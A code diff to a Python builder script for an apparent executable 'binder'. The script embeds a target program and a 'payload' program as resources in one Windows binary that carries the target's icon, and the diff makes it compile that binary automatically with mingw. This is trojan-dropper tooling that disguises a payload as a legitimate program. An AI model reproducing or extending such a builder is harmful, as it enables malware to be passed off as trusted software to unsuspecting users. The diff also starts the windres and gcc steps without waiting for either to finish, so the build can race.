@@ -15,11 +15,13 @@ class Main:
 
         self.RESOURCE_FILE_PATH = "res.rc"
         self.RESOURCE_OBJ_PATH = "res.o"
-        self.BINDER_SRC_PATH = "binder.c"
+        self.RES_BIN_EXT = ".txt"
+        self.BINDER_SRC_PATH = "src/binder.c"
         self.ICON_PATH = "target_icon.ico"
         self.TARGET_BINARY_RES_PATH = "target.txt"
         self.PAYLOAD_BINARY_RES_PATH ="payload.txt"
         self.FLAGS = "-lshlwapi"
+        self.OUTPUT_DIR = "output"
 
         self.res_content = []
 
@@ -36,16 +38,21 @@ class Main:
 
         options = parser.parse_args()
 
-        self.output = options.output
-
-        #debug
-        print (options.binary1)
-        print (options.binary2)
-        print(options.output)
-        print(options.icon)
+        self.output = self.OUTPUT_DIR + "/" + options.output
 
         if options.icon == "":
             self.noicon = True
+
+        if self.quiet == False:
+            #debug
+            print ("[*] Binaire 1 : " + options.binary1)
+            print ("[*] Binaire 2 : " + options.binary2)
+            print ("[*] Output binary will be : " + options.output)
+
+            if options.icon == "":
+                print("[-] No icon")
+            else:
+                print("[*] Icon : " + options.icon)
 
         for path in [options.binary1, options.binary2, options.icon]:
             
@@ -74,7 +81,7 @@ class Main:
         if ext == 'ico':
             output = self.ICON_PATH
         else:
-            output = basename + '.txt'
+            output = basename + self.RES_BIN_EXT
         
         shutil.copyfile(filepath, output)
 
@@ -106,6 +113,14 @@ class Main:
 
         print("x86_64-w64-mingw32-windres {resfile} {resobj}".format(resfile=self.RESOURCE_FILE_PATH, resobj=self.RESOURCE_OBJ_PATH))  
         print("x86_64-w64-mingw32-gcc {src} -o {output} {objres} {flag}".format(src=self.BINDER_SRC_PATH, output=self.output, objres=self.RESOURCE_OBJ_PATH, flag=self.FLAGS))
+
+        res_command = "x86_64-w64-mingw32-windres {resfile} {resobj}".format(resfile=self.RESOURCE_FILE_PATH, resobj=self.RESOURCE_OBJ_PATH)
+        build_command = "x86_64-w64-mingw32-gcc {src} -o {output} {objres} {flag}".format(src=self.BINDER_SRC_PATH, output=self.output, objres=self.RESOURCE_OBJ_PATH, flag=self.FLAGS)
+
+        subprocess.Popen(res_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.Popen(build_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
 if __name__ == "__main__":
     main = Main()
     main.execute()
